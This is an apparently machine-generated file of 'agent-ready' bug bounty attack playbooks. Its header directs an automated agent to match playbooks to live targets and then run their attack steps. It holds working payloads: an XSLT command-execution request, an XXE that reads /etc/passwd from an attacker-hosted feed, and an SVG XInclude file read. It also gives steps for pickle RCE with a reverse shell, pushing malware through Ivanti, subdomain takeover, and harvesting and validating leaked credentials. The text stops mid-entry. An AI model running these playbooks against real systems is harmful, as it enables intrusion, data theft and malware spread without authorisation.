description: Agent-ready bug bounty playbooks extracted from writeups.json. Same schema as agent_playbooks_github.json — safe to merge.

usage.step_1: Load tactic_index.json and look up your target's technology under by_technology to get relevant playbook IDs.
usage.step_2: Filter by by_access_level matching your current access to the target.
usage.step_3: Prioritize IDs in high_confidence and quick_wins lists for best hit rate.
usage.step_4: Load matching playbooks from this file by their 'id' field.
usage.step_5: Check trigger_conditions.prerequisites and applicability_signals against the live target.
usage.step_6: If conditions match, run attack_playbook.recon_steps first, then attack_steps.
usage.step_7: Confirm with success_indicators. If failed, use failure_indicators to pivot.

meta.title: MyBB Admin Panel RCE CVE-2023-41362

trigger_conditions.when_to_apply: When an authenticated user has access to the MyBB Admin Panel template editing functionality.
prerequisites: Attacker must have valid administrative credentials for MyBB.
applicability_signals: Access to the 'Templates & Style' -> 'Templates' section in the admin panel.
The target MyBB version is vulnerable to CVE-2023-41362.
skip_if: The MyBB version has been patched against CVE-2023-41362.
The user account lacks administrative privileges.

recon_steps: Step 1: Log in to the MyBB Admin Panel using legitimate credentials.
Step 2: Navigate to 'Templates & Style' -> 'Templates' and identify a template to edit (e.g., 'Default Templates' -> 'Who's Online Templates' -> 'online').
attack_steps: Step 1: Edit the selected template and prepend the RCE payload to the existing content.
Step 2: Save the modified template.
Step 3: Trigger the execution of the injected payload by making a request that causes the template to be rendered in a context where `eval()` would be called.
Step 4: For RCE, craft a URL with a query parameter (e.g., `?1=<command>`) to pass the shell command to be executed via `eval()`.
tools_recommended: Burp Suite: To intercept and modify template requests.
A PHP interpreter: To test regex backtrack limits locally if needed.
success_indicators: Executing a command like `whoami` and seeing the output in the response.
Accessing sensitive files or executing arbitrary code on the server.
failure_indicators: Template save fails with an error related to regex or syntax.
The payload is not executed, and no unexpected behavior is observed.
A 403 Forbidden or similar error occurs, indicating a WAF or input validation preventing the payload. In this case, try adjusting the payload or the string used to trigger the ReDoS.

playbooks.impact: Remote Code Execution (RCE) on the MyBB server, allowing the attacker to gain full control over the affected system, access sensitive data, and perform any actions the web server user can.
playbooks.key_lesson: When analyzing template engines that use `eval()` or similar functions, investigate how user-supplied templates are sanitized, especially focusing on regex validation and potential ReDoS vulnerabilities that could bypass these checks to inject executable code.

meta.title: Orbeon Forms: The Final Form? On A Journey To RCE

tech_stack_fingerprints: Server: Apache-Coyote/9.0.x (Tomcat version often revealed in headers)

trigger_conditions.when_to_apply: When the application exposes the `/xforms-renderer` endpoint and processes XML data, especially if it involves XSLT transformations.
prerequisites: The target must be running Orbeon Forms.
The `/xforms-renderer` servlet must be accessible.
applicability_signals: The presence of the `/xforms-renderer` URL pattern in `web.xml`.
Responses from `/xforms-renderer` that indicate XML processing or form rendering.
skip_if: A WAF blocks requests containing XML or XSLT payloads.
The `/xforms-renderer` endpoint returns an error for all requests regardless of input.

recon_steps: Step 1: Analyze the `WEB-INF/web.xml` file to identify servlet mappings, specifically looking for `/xforms-renderer` and its associated servlet class (`org.orbeon.oxf.servlet.OrbeonServlet`).

Step 2: Send unauthenticated HTTP requests to `/xforms-renderer` with various content types (e.g., `text/xml`, `application/xml`) to observe responses and determine if it accepts XML input for processing.
attack_steps: Step 1: Craft an XML payload that includes a malicious XSLT transformation designed to execute arbitrary commands. This payload will target the XSLT processor within Orbeon Forms.
Step 2: Send a POST request to the `/xforms-renderer` endpoint with the `Content-Type` header set to `application/xml` and the crafted XML payload as the request body.

Step 3: Monitor for a callback to an external server (e.g., Burp Collaborator, a listener on attacker-controlled infrastructure) or observe for any changes in the application's behavior that indicate command execution.
payloads_or_patterns:
POST /xforms-renderer HTTP/1.1
Host: <TARGET_URL>
Content-Type: application/xml

<request>
  <xml-data>
    <![CDATA[
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:exslt="http://exslt.org/common">
<xsl:output method="text"/>
<xsl:template match="/">
  <xsl:variable name="cmd">
    <xsl:value-of select="exslt:node-set(exslt:function(document('xalan://java.lang.Runtime')//method[@name='exec']/
        methodCall[@name='exec']/
        new [
          'ls',
          'id'
        ]))"/>
  </xsl:variable>
  <xsl:copy-of select="$cmd"/>
</xsl:template>
</xsl:stylesheet>
    ]]>
  </xml-data>
</request>
tools_recommended: Burp Suite: To intercept and modify requests, and to host a Collaborator client for detecting callbacks.
curl: For sending crafted HTTP requests manually.
success_indicators: Receiving a callback to Burp Collaborator or a custom listener containing the output of executed commands (e.g., directory listings, user information).
The response from `/xforms-renderer` containing the command output.
failure_indicators: Receiving a 400 or 500 error from `/xforms-renderer` without any command output, suggesting the XML payload or XSLT is not processed as expected.
No callbacks received after multiple attempts, indicating potential WAF blocking or misconfiguration.
Response indicates an invalid XSLT or XML structure.

playbooks.impact: Remote Code Execution (RCE) on the server hosting Orbeon Forms, allowing an attacker to execute arbitrary commands with the privileges of the application's user.
playbooks.key_lesson: When encountering Java applications that process XML, especially those with endpoints like 'xforms-renderer', investigate potential XXE and XSLT-based RCE vulnerabilities by crafting malicious XSLT transformations to exfiltrate data or execute commands.

meta.title: Paranoids Vulnerability Research: Ivanti Issues Security Alert
meta.category: RCE, Insecure deserialization, Security code review

trigger_conditions.when_to_apply: Target Ivanti Endpoint Manager (EPM) versions 2022 SU3 and prior, or 2021 versions without the specific hotfix, where the management server is either directly exposed to the internet or accessible via internal network access (e.g., VPN, SSRF).
prerequisites: Target is running Ivanti Endpoint Manager (EPM) versions 2022 SU3 and prior or unpatched 2021 versions.
Attacker has internal network access or a strong SSRF primitive if the EPM server is not internet-facing.
applicability_signals: Presence of Ivanti Endpoint Manager (EPM) software.
Vulnerable version identified.
skip_if: Target is running Ivanti EPM 2022 SU4 or later.
Target is running 2021 SU4 and has applied the hotfix for CVE-2023-28323.

recon_steps: Step 1: Identify if Ivanti Endpoint Manager (EPM) is in use and determine its version. Check for indications of internet exposure or potential internal network access points.
Step 2: Correlate the identified EPM version against the vulnerability advisory to confirm if it is within the vulnerable range (2022 SU3 and prior, or 2021 versions without the hotfix).
attack_steps: Step 1: Exploit the 'Unsafe Deserialization Leading to RCE' vulnerability (CVE-2023-28323) by crafting and sending a malicious serialized object.
Step 2: Leverage the RCE to distribute malicious software to managed endpoints.
Step 3: If direct internet exposure is not present, use internal network access (e.g., VPN, SSRF) to reach the EPM server and initiate the RCE exploit.
payloads_or_patterns: insufficient detail in writeup
tools_recommended: Custom exploit development framework for crafting and delivering serialized payloads.
Tools for network pivoting and lateral movement if internal access is required.
success_indicators: Successful execution of arbitrary code on the Ivanti EPM server.
Distribution of malicious software to managed endpoints.
Confirmation of malware execution on target endpoints.
failure_indicators: No code execution achieved after payload delivery. Suggestion: Investigate other identified vulnerabilities (CVE-2023-28324, CVE-2023-38343, CVE-2023-38344) or attempt to exploit them.
Firewall blocking of outbound connections required for exploit. Suggestion: Attempt to exploit via an alternative network path or method.

playbooks.impact: Remote Code Execution on Ivanti Endpoint Manager servers, enabling an attacker to distribute malicious software to all managed endpoints, potentially leading to widespread compromise of an enterprise network.
playbooks.key_lesson: Always prioritize patching and timely updates for endpoint management solutions, as vulnerabilities in these tools can have a devastating impact on network security.

meta.title: Back to the 90s: Fujitsu “IP series” Real-time Video Transmission Gear Hard Coded Credentials

target_profile.technology: Fujitsu IP series real-time video transmission gear
tech_stack_fingerprints: Fujitsu IP series device models (IP-HE950E, IP-HE950D, IP-HE900E, IP-HE900D, IP-900E, IP-920E, IP-900D, IP-900?D, IP-920D, IP-90, IP-9610)

trigger_conditions.when_to_apply: When an attacker has network access to a Fujitsu IP series real-time video transmission device and can identify its model and firmware version.
prerequisites: Network accessibility to the target Fujitsu device.
applicability_signals: Target device is identified as one of the affected Fujitsu IP series models.
Firmware version is identified as being prior to July 26, 2023.
skip_if: Target device firmware has been updated to July 26, 2023 or later.
Device is not accessible from the attacker's network.

recon_steps: Step 1: Identify the Fujitsu IP series device model and its firmware version through network scanning or device enumeration.
Step 2: Compare the identified firmware version against the known vulnerable ranges listed in the CVE information.
attack_steps: Step 1: Attempt to log in to the device's administrative interface (if web-based) using the known hardcoded credentials. The writeup does not specify the exact credentials, only that they exist.
Step 2: If login is successful, proceed to enumerate and exfiltrate sensitive configuration data or control device functions.
Step 3: If the device has a web interface, attempt to use the hardcoded credentials via HTTP POST requests to login endpoints.
payloads_or_patterns: The specific hardcoded credentials are not detailed in the writeup. They would need to be discovered through firmware reverse engineering or disclosed by the vendor/security advisory.

Assume standard HTTP POST request to a login endpoint, e.g.: POST /login.cgi HTTP/1.1
Host: <TARGET_IP>
Content-Type: application/x-www-form-urlencoded

username=<HARDCODED_USERNAME>&password=<HARDCODED_PASSWORD>
tools_recommended: Nmap: For network scanning and service discovery to identify target devices.
Wireshark: For capturing network traffic and analyzing potential authentication attempts.
Firmware analysis tools (e.g., Binwalk, Ghidra): If attempting to reverse engineer firmware to discover credentials (as done by the authors).
Burp Suite: To intercept and modify HTTP requests during authentication attempts.
success_indicators: Successful authentication to the device's administrative interface without requiring user-defined credentials.
Access to device configuration settings, logs, or real-time video feeds that are normally restricted.
failure_indicators: Login attempts with generic or reverse-engineered credentials fail.
Device requires a user-defined password that cannot be bypassed.
Response indicates invalid credentials for all attempts.

playbooks.impact: Gaining administrative control over Fujitsu IP series real-time video transmission devices, allowing an attacker to access sensitive video streams, alter device configuration, and use the device as a pivot point into the internal network.
playbooks.key_lesson: Hardcoded credentials, especially administrative ones, in embedded and IoT devices represent a significant security risk and should be actively sought and reported.

meta.title: Kirby < 3.9.6 XML External Entity (XXE) vulnerability — CVE-2023-38490

tech_stack_fingerprints: Kirby CMS is a PHP CMS

trigger_conditions.when_to_apply: When a Kirby CMS installation uses a custom development or an installed extension that calls the `Xml::parse()` function with user-controllable XML input.
prerequisites: The target Kirby installation must be vulnerable to XXE (i.e., using a version with `LIBXML_NOENT` enabled in `Xml::parse` and accepting user-controlled XML input).
The attacker must be able to control the XML content being parsed, typically through a parameter that accepts a URL to an XML feed.
applicability_signals: The presence of the `Xml::parse()` function with the `LIBXML_NOENT` option in the Kirby core or custom code.
A feature that accepts an RSS feed or any XML source from a user-controllable URL.
skip_if: The `Xml::parse()` function is not used, or the `LIBXML_NOENT` option is disabled.
All XML parsing functions explicitly disable entity loading.

recon_steps: Step 1: Identify Kirby CMS version. If it's older than 3.9.6, it might be vulnerable if `Xml::parse()` is used with `LIBXML_NOENT`.
Step 2: Review custom code or installed extensions for usage of `Xml::parse()`. Look for functions that accept external XML feeds or directly parse user-supplied XML strings.
attack_steps: Step 1: Set up an HTTP server to host a malicious XML file (e.g., `xxe.rss`).
Step 2: Craft a malicious XML file that includes an XXE payload to read a local file (e.g., `/etc/passwd`).
Step 3: Identify a vulnerable endpoint in the target Kirby CMS that accepts a URL for an XML feed (e.g., a virtual page created from an RSS feed).

Step 4: Trigger the vulnerability by submitting a request to the identified endpoint with the malicious XML file hosted on your HTTP server as the feed URL. Example: `http://<TARGET_URL>/<VULNERABLE_ENDPOINT>?feed=http://<YOUR_IP>:<YOUR_PORT>/xxe.rss`.
payloads_or_patterns:
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<rss><channel><title>test</title><link>http://example.com</link><description>&xxe;</description></channel></rss>
tools_recommended: Burp Suite: To host the malicious XML file and monitor HTTP requests.
A simple HTTP server (e.g., Python's `http.server`)
success_indicators: The target application's response contains the content of the local file that was targeted by the XXE payload (e.g., the content of `/etc/passwd`).
failure_indicators: A 404 or 500 error indicating the feed URL was not found or could not be processed.

The response does not contain the content of the targeted local file, indicating the XXE payload was not processed correctly (e.g., due to XML validation or entity resolution being disabled). Pivot: Try different local file paths or look for other XXE vulnerable functionalities.

playbooks.impact: An attacker can read arbitrary local files from the Kirby CMS server, potentially including sensitive information such as configuration files, user credentials, or system information, leading to further compromise.
playbooks.key_lesson: When parsing XML from untrusted sources, always disable external entity loading (`LIBXML_NOENT` and `libxml_disable_entity_loader`) to prevent XXE vulnerabilities.

meta.title: Apache Superset Part II: RCE, Credential Harvesting and More

tech_stack_fingerprints: Server responds with Apache Superset related headers or HTML structure
Specific JavaScript global variables associated with Superset frontend

trigger_conditions.when_to_apply: When an attacker can craft a malicious request targeting the SQLAlchemy filter functionality, which is vulnerable to deserialization attacks.
prerequisites: The target must be running a vulnerable version of Apache Superset.
The SQLAlchemy filter feature must be enabled or accessible.
applicability_signals: The presence of an endpoint that allows arbitrary Python code execution through serialized objects, particularly within the SQLAlchemy filter mechanism.
Server responses that indicate the use of Python/Flask and potentially the `pickle` module.
skip_if: The target is not running Apache Superset.
A WAF or security control blocks crafted serialized payloads.

recon_steps: Step 1: Identify Apache Superset instances by scanning for common Superset endpoints and signatures.
Step 2: Confirm the presence and accessibility of the SQLAlchemy filter or any component that processes serialized Python objects.
attack_steps: Step 1: Craft a malicious serialized Python object (e.g., using `pickle`) that executes arbitrary code on the server.
Step 2: Send the crafted payload to the vulnerable endpoint, likely involving requests that interact with or configure the SQLAlchemy filter.
Step 3: Monitor for outbound network connections or system command execution on the target server.
payloads_or_patterns: Python script to generate a malicious pickle payload, e.g., `pickle.dumps(RCE_object)` where `RCE_object` is crafted to execute commands.
tools_recommended: ysoserial (for generating Java deserialization payloads, though Python pickle is more relevant here)
Custom Python scripts for crafting and sending pickle payloads
Burp Suite or similar proxy for intercepting and modifying requests
success_indicators: Reverse shell connection established from the target server to the attacker's machine.
Outbound network connections to attacker-controlled infrastructure (e.g., HTTP requests, DNS lookups).
Successful execution of commands on the target system, observed through feedback in the crafted payload or subsequent interactions.
failure_indicators: The target server returns an error indicating deserialization issues or payload rejection.
No observable command execution or network callbacks from the target server.
Responses indicating that the payload was sanitized or ignored (e.g., generic error messages, 400 Bad Request).

playbooks.impact: Remote Code Execution (RCE) on the Apache Superset server, allowing an attacker to gain full control of the compromised instance, potentially leading to data exfiltration, further network pivoting, or credential harvesting.
playbooks.key_lesson: Always validate and sanitize inputs that are deserialized, especially when they originate from external or untrusted sources, as this is a common vector for RCE.

meta.title: Again? Subdomain takeover via ideanote.io

affected_components: subdomains configured with CNAME to custom-domain.ideanote.io
tech_stack_fingerprints: HTTP 200 OK response for the subdomain
Page title 'Ideanote' or similar associated with ideanote.io

trigger_conditions.when_to_apply: Applicable when a subdomain is found to be CNAME'd to 'custom-domain.ideanote.io' and the ideanote.io platform still controls that CNAME target.
prerequisites: Attacker can identify subdomains using CNAME records.
The target subdomain's DNS resolves to 'custom-domain.ideanote.io'.
applicability_signals: Subdomain's CNAME record points to 'custom-domain.ideanote.io'.
The subdomain returns an HTTP 200 status code.
The page title of the subdomain is 'Ideanote' or related content.
skip_if: The CNAME target is not 'custom-domain.ideanote.io'.
The subdomain returns a 404 Not Found or similar error indicating the target is not served by ideanote.io.
The ideanote.io platform has unlinked the CNAME or the target subdomain is actively in use by the original owner.

recon_steps: Step 1: Use `httpx` with the `-cname -sc -title -mc 200` flags on a list of potential subdomains to identify those CNAME'd to 'custom-domain.ideanote.io' and returning a 200 status code with a relevant title.
Step 2: Use `dig` to manually verify the CNAME record for suspicious subdomains: `dig <subdomain> | grep CNAME`.
attack_steps: Step 1: Identify a subdomain that is CNAME'd to 'custom-domain.ideanote.io' and returns a 200 OK status code.
Step 2: Sign up for an account on ideanote.io.
Step 3: Navigate to the 'Workspace' menu within the ideanote.io account.
Step 4: In the 'Custom domain' section, attempt to add the identified vulnerable subdomain as a custom domain.
Step 5: Configure the title, description, and other settings as desired for the takeover.
Step 6: Save the custom domain configuration.
payloads_or_patterns: CNAME value: custom-domain.ideanote.io
HTTP Status Code: 200
Page Title: Ideanote
tools_recommended: httpx: `httpx -silent -cname -sc -title -mc 200 <list_of_subdomains_file>`
dig: `dig <vulnerable_subdomain> | grep CNAME`
ideanote.io account signup
ideanote.io platform custom domain configuration interface
success_indicators: The attacker's custom content (title, description) is displayed when visiting the subdomain.
The subdomain now serves content controlled by the attacker via ideanote.io.
failure_indicators: Unable to add the custom domain in ideanote.io (e.g., 'subdomain already in use' or similar error).
The subdomain continues to display default or error pages from ideanote.io after configuration.
HTTP 404 or other non-200 status codes after attempting takeover.

playbooks.impact: Full control over the subdomain's content, potentially leading to phishing, credential harvesting, hosting malicious content, or defacement, leveraging the trust associated with the original domain.
playbooks.key_lesson: When identifying subdomains pointing to third-party services via CNAME, always verify if the service provider allows the subdomain to be claimed by another user, especially if the original domain owner has disassociated the subdomain from the service.

meta.title: 4,500 of the Top 1 Million Websites Leaked Source Code, Secrets
meta.authors: Joe Leon, Harsh Bothra, Luke Stephens

trigger_conditions.when_to_apply: When a web application exposes its .git directory publicly, allowing access to source code and credentials.
prerequisites: The target website uses Git for version control.
applicability_signals: The target website responds with an HTTP 200 status code when accessing the /.git path.
A WAF is not blocking direct access to the /.git path.
skip_if: The target website returns an HTTP 403 or 404 for the /.git path, indicating it's not exposed or blocked by a WAF.

recon_steps: Step 1: For each target in the Alexa Top 1 Million Websites list, attempt to access the /.git directory via an HTTP GET request. Example: curl -I <TARGET_URL>/.git
Step 2: Analyze the HTTP response codes for the /.git directory access. A 200 OK indicates potential exposure.
attack_steps: Step 1: If a 200 OK is received for /.git, attempt to download the contents of the .git directory. This can be done by recursively fetching files within the directory.
Step 2: Scan the downloaded source code and configuration files for sensitive information such as API keys, passwords, private keys, and internal service names.
Step 3: For identified credentials, attempt to validate their validity by interacting with the corresponding third-party services (e.g., GitHub API for tokens, AWS CLI for keys).
payloads_or_patterns: /.git
git config
AWS access key ID
GitHub Personal Access Token
Mailgun API Key
SendInBlue API Key
Mailchimp API Key
Sendgrid API Key
tools_recommended: curl: For initial reconnaissance and fetching files.
git: To clone or download the .git repository contents.
TruffleHog: To scan the cloned repository for secrets.
grep: For pattern matching within downloaded files.
Burp Suite: To intercept and analyze HTTP requests/responses if WAF interaction is observed.
success_indicators: Discovery of plaintext credentials (API keys, passwords, tokens) in downloaded files or commit history.
Successful validation of found API keys or tokens against their respective services, returning user information or granting access.
Finding of a private RSA key corresponding to the domain's TLS certificate.
failure_indicators: Consistent 403 or 404 responses for /.git across multiple targets, suggesting WAF protection or absence of the directory.
Downloading a .git directory but finding no sensitive information within the source code or configuration files.

playbooks.impact: Attacker can gain access to the entire source code of a web application, exposing proprietary algorithms, trade secrets, and internal logic. Exposed credentials allow unauthorized access to third-party services (AWS, GitHub, email marketing platforms), potentially leading to account compromise, data exfiltration, financial loss, or further system compromise. A leaked TLS private key enables man-in-the-middle attacks.
playbooks.key_lesson: Always scan for publicly exposed .git directories and recursively download their contents. Utilize secret scanning tools like TruffleHog on the downloaded code to identify credentials and sensitive information.

meta.title: Part 3: Learning iOS App Pentesting and Application Security with Real-World Case Studies

trigger_conditions.when_to_apply: When an iOS application accepts and deserializes data from an untrusted source without proper validation.
prerequisites: Ability to intercept and modify network traffic to/from the iOS application.
applicability_signals: Application uses insecure deserialization libraries or patterns.
Application communicates sensitive data over the network.
Application allows user-supplied data to be deserialized.
skip_if: Application strictly validates all incoming data before deserialization.
Application does not deserialize any untrusted input.

recon_steps: Step 1: Intercept network traffic from the target iOS application using a proxy like Burp Suite or mitmproxy.
Step 2: Analyze intercepted requests and responses to identify data serialization formats (e.g., JSON, XML, Protocol Buffers) and any endpoints that handle user-supplied or untrusted data.
attack_steps: Step 1: Identify a data structure or payload within the intercepted traffic that is being deserialized by the application.

Step 2: Craft a malicious payload designed to exploit the specific deserialization vulnerability of the library or framework being used. This might involve creating a crafted object that, when deserialized, triggers arbitrary code execution or other unintended behavior.
Step 3: Replace the legitimate payload with the malicious payload in the intercepted request and forward it to the target application.
Step 4: Observe the application's response and behavior for signs of successful exploitation.
payloads_or_patterns: Insufficient detail in writeup
tools_recommended: Burp Suite: For intercepting and modifying HTTP traffic, identifying serialization formats.
mitmproxy: Similar to Burp Suite, useful for analyzing and manipulating network traffic.
ysoserial: A tool for generating payloads for various Java deserialization vulnerabilities. (May need adaptation for other languages/frameworks).
success_indicators: Application crash or unexpected behavior.
Receipt of callbacks from a listener set up to detect code execution (e.g., on a collaborator server).
Modification of application state or data that should not be possible.
failure_indicators: Application returns a generic error message or gracefully handles the malformed payload.
No observable change in application behavior or state.
WAF blocks the crafted payload.

playbooks.impact: Execution of arbitrary code on the server-side or client-side, leading to data exfiltration, system compromise, denial-of-service, or further exploitation.
playbooks.key_lesson: Always validate and sanitize data received from untrusted sources before deserialization to prevent insecure deserialization vulnerabilities.

meta.title: Subdomain takeover via nolt.io

affected_components: subdomains configured with CNAME to nolt.io

trigger_conditions.when_to_apply: When a subdomain is found to have a CNAME record pointing to 'cname.nolt.io' and the associated Nolt service is no longer actively managed by the original owner.
prerequisites: Attacker can identify subdomains pointing to 'cname.nolt.io'.
applicability_signals: Subdomain's DNS resolution shows CNAME record pointing to 'cname.nolt.io'.
skip_if: The CNAME record is actively managed by the legitimate owner and not vulnerable.
The target service explicitly blocks or detects unauthorized custom domain configurations.

recon_steps: Step 1: Use `httpx -cname -sc -fr -title -silent` against a list of subdomains to identify those with a CNAME pointing to 'cname.nolt.io'.
Step 2: For identified subdomains, perform a DNS lookup (e.g., `dig <subdomain> | grep CNAME`) to confirm the CNAME record points to 'cname.nolt.io'.
attack_steps: Step 1: Configure the identified subdomain to point to the attacker's Nolt account following Nolt's custom domain setup guide.
Step 2: Monitor the DNS resolution and Nolt service for confirmation of successful takeover.
payloads_or_patterns: CNAME target: cname.nolt.io
tools_recommended: httpx: For mass scanning and CNAME identification.
dig: For detailed DNS record verification.
Nolt.io custom domain configuration: Follow official documentation.
success_indicators: The custom domain configuration within Nolt returns 'true'.
The subdomain now serves content controlled by the attacker via Nolt.
failure_indicators: Nolt's custom domain configuration returns 'false' or an error.
The subdomain continues to serve the original (or error) content and does not reflect attacker-controlled Nolt content. → Suggest verifying CNAME setup and Nolt account status.

playbooks.impact: Attacker gains control of the victim's subdomain, potentially serving phishing pages, distributing malware, or hosting malicious content, impacting the reputation and trust associated with the subdomain.
playbooks.key_lesson: When identifying subdomains with CNAME records pointing to third-party services, verify if the service allows for account takeovers by reconfiguring the CNAME to point to an attacker-controlled account.

meta.title: CVE-2023-4634 - Tricky Unauthenticated RCE on Wordpress Media Library Assistant Plugin

trigger_conditions.when_to_apply: When the Media Library Assistant WordPress plugin is installed and the target is accessible via HTTP/S.
prerequisites: Media Library Assistant plugin installed and active.
applicability_signals: The existence of the endpoint: /wp-content/plugins/media-library-assistant/includes/mla-file-downloader.php
The presence of parameters: mla_download_type and mla_download_file.
skip_if: The plugin is not installed or deactivated.
A Web Application Firewall (WAF) blocks requests to mla-file-downloader.php.

recon_steps: Step 1: Confirm the presence of the Media Library Assistant plugin by checking for the existence of /wp-content/plugins/media-library-assistant/includes/mla-file-downloader.php.
Step 2: Inspect the plugin's functionality for file download features that might be exploitable.
attack_steps: Step 1: Send a GET request to the vulnerable endpoint with the `mla_download_type` parameter set to a value that can trigger imagick processing (e.g., 'application/x-shockwave-flash') and `mla_download_file` set to a path that can lead to code execution.

Step 2: The writeup mentions an LFI vulnerability which can be chained with imagick for RCE. The exact payload and chaining steps are not fully detailed in the writeup, but the principle is to leverage imagick's ability to process malicious inputs to achieve code execution.
payloads_or_patterns: http://<TARGET_URL>/wp-content/plugins/media-library-assistant/includes/mla-file-downloader.php?mla_download_type=application/x-shockwave-flash&mla_download_file=<MALICIOUS_FILE_PATH>
tools_recommended: Burp Suite (for intercepting and modifying requests)
Custom scripts for automated testing
success_indicators: Remote code execution confirmed via a callback (e.g., to a controlled server) or a recognizable system response indicative of code execution (e.g., specific output from a command).
failure_indicators: Receiving a 404 Not Found for the mla-file-downloader.php endpoint (plugin not installed/active).
Receiving a 403 Forbidden or other access denied error (WAF blocking).
No observable RCE behavior after attempting the exploit.

playbooks.impact: Unauthenticated Remote Code Execution (RCE) on the target WordPress server, allowing an attacker to gain full control of the server.
playbooks.key_lesson: When a plugin is identified with a known LFI vulnerability, investigate if it can be chained with other functionalities (like image processing libraries such as Imagick) to achieve RCE, especially if the LFI is only absolute path-based.

meta.title: When URL parsers disagree (CVE-2023-38633)

tech_stack_fingerprints: Usage of librsvg for SVG thumbnail generation

trigger_conditions.when_to_apply: When a system processes user-provided SVG files for rendering and uses librsvg, and the SVG can contain XInclude directives that reference local files.
prerequisites: Target system uses librsvg for SVG processing.
The SVG processing pipeline allows for XInclude directives.
Attacker can provide a crafted SVG file.
applicability_signals: The system accepts SVG uploads for rendering.
The system's SVG rendering library is librsvg or a dependency like libvips.
Observable behavior when processing SVGs with XInclude directives (e.g., specific error messages or file inclusion attempts).
skip_if: The system sanitizes or strictly validates SVG content, removing XInclude directives.
The SVG rendering library does not support XInclude or is not susceptible to parser disagreements.
The system runs librsvg in a highly restricted sandbox that prevents file access.

recon_steps: Step 1: Identify if the target system uses librsvg or libvips for SVG processing, and if user-supplied SVGs are rendered (e.g., for thumbnails, previews).
Step 2: Analyze the SVG processing pipeline to determine if XInclude directives are supported and if they are parsed in a way that could lead to path traversal.
attack_steps: Step 1: Craft an SVG file containing an `xi:include` directive pointing to a sensitive local file (e.g., `/etc/passwd`).
Step 2: Embed the crafted SVG within a `data:` URI in an `image` tag of an outer SVG or send it directly if the system allows direct SVG uploads.
Step 3: Submit the crafted SVG to the target system for rendering.
Step 4: Analyze the output of the rendering process for any signs of the included file's content.
payloads_or_patterns:
<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<svg width="300" height="300" xmlns:xi="http://www.w3.org/2001/XInclude">
  <rect width="300" height="300" style="fill:rgb(255,204,204);" />
  <text x="0" y="100">
    <xi:include href="/etc/passwd" parse="text" encoding="ASCII">
      <xi:fallback>file not found</xi:fallback>
    </xi:include>
  </text>
</svg>

<svg width="300" height="300" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="data:image/svg;base64,<base64_encoded_crafted_svg>" />
</svg>
tools_recommended: Burp Suite: To intercept and modify SVG requests.
Online Base64 encoder/decoder: For embedding SVGs in `data:` URIs.
success_indicators: The rendered output (e.g., PNG thumbnail) contains content from the included file (e.g., lines from /etc/passwd).
Absence of the 'file not found' fallback message in the output, indicating successful inclusion.
failure_indicators: The rendered output contains the 'file not found' fallback message, or is blank, indicating the file was not included.
A security error or exception is returned by the server.
The SVG is rejected due to invalid syntax or sanitization.

playbooks.impact: Attacker can read arbitrary files on the server, potentially including sensitive configuration files, source code, or user data, leading to further system compromise.
playbooks.key_lesson: Be vigilant about how different parser implementations within a dependency (like librsvg's Rust and Glib URL parsers) might interpret resource inclusion directives (like XInclude) differently, as this can lead to subtle path traversal vulnerabilities.

meta.title: Uncovering Web Cache Deception: A Missed Vulnerability in the Most Unexpected Places

target_profile.technology: Web Application (specifics not detailed, but uses caching mechanisms)

trigger_conditions.when_to_apply: When a web application fails to properly implement cache control mechanisms on error pages or non-existent URLs, especially when these pages inadvertently serve sensitive information.
prerequisites: Victim is logged into the website.
applicability_signals: Requests to non-existent URLs return sensitive PII in the response.
Response headers indicate caching ('cache-control: public', 'HIT').
Error pages (like 404) do not have proper cache control policies.
skip_if: All responses to non-existent URLs are generic error messages without PII.
Web application strictly enforces cache control on all endpoints, including error pages.

recon_steps: Step 1: As an authenticated user, navigate to a known-good URL with a unique query parameter (e.g., https://redacted.com/favicon.ico?agilehunt=13337) to establish a baseline cacheable request.
Step 2: Observe the response headers for 'cache-control' and cache status from the server after visiting the URL twice, confirming it is being cached ('cache-control: public', 'HIT').
Step 3: Access various non-existent URLs (e.g., /nonexistentdirectory/, /anothernonexistentpath/) while authenticated and observe the responses for PII data.
Step 4: Note any non-existent URL that returns PII and has misconfigured cache controls.
attack_steps: Step 1: Identify a non-existent URL that, when accessed by an authenticated user, returns PII and has 'cache-control: public' set.

Step 2: Utilize Burp Suite Intruder or a similar tool to repeatedly send requests to the identified non-existent URL with a unique query parameter (e.g., https://redacted.com/favicon.ico?agilehunt=13337) using a null payload and a large number of iterations (e.g., 500).

Step 3: While the requests are being sent, initiate a new, unauthenticated request to the same non-existent URL (e.g., https://redacted.com/favicon.ico?agilehunt=13337) using a private browsing session or Burp Repeater without any cookies or authorization tokens.
Step 4: Observe the response from the unauthenticated request.
payloads_or_patterns:
GET /favicon.ico?agilehunt=<random_number> HTTP/1.1
Host: redacted.com
Cookie: <SESSION_TOKEN>

 (Authenticated request)

GET /favicon.ico?agilehunt=<random_number> HTTP/1.1
Host: redacted.com

 (Unauthenticated request)
tools_recommended: Burp Suite Intruder: Configure to send repeated requests to the non-existent URL with a null payload and a high count (e.g., 500 iterations).
Burp Suite Repeater: To send the unauthenticated request and observe the response.
Private browsing session (e.g., Incognito mode): To simulate an unauthenticated user.
success_indicators: The unauthenticated request returns sensitive PII data (First Name, Last Name, Phone Number, Email Address, User Id, Encrypted IP Address) that was cached from the authenticated session.
failure_indicators: The unauthenticated request returns a standard 404 error without any PII, or a generic error message.
The unauthenticated request returns a 403 Forbidden or similar access denied error.

playbooks.impact: Unauthorized access to sensitive Personally Identifiable Information (PII) including First Name, Last Name, Phone Number, Email Address, User Id, and Encrypted IP Address. This can lead to privacy violations, identity theft, and facilitate further attacks like IDOR by revealing User IDs.
playbooks.key_lesson: Always implement strict cache control policies on all endpoints, including error pages and non-existent URLs, to prevent the leakage of sensitive information.

meta.title: Code Vulnerabilities Put Proton Mails at Risk

trigger_conditions.when_to_apply: This technique is applicable when a web application parses or renders user-provided content in a way that can lead to code injection, such as insufficient sanitization of HTML or JavaScript inputs.
prerequisites: The target must be a web application that processes and displays user-generated content.
applicability_signals: User input fields that are reflected in the application's response without proper sanitization.
The presence of client-side JavaScript that processes user input.
Observed bypass of content security policies (CSP).
skip_if: All user-generated content is strictly sanitized and encoded before rendering.
A robust Content Security Policy (CSP) effectively mitigates all forms of XSS.

recon_steps: Identify all user input fields and parameters that are reflected in the application's responses.
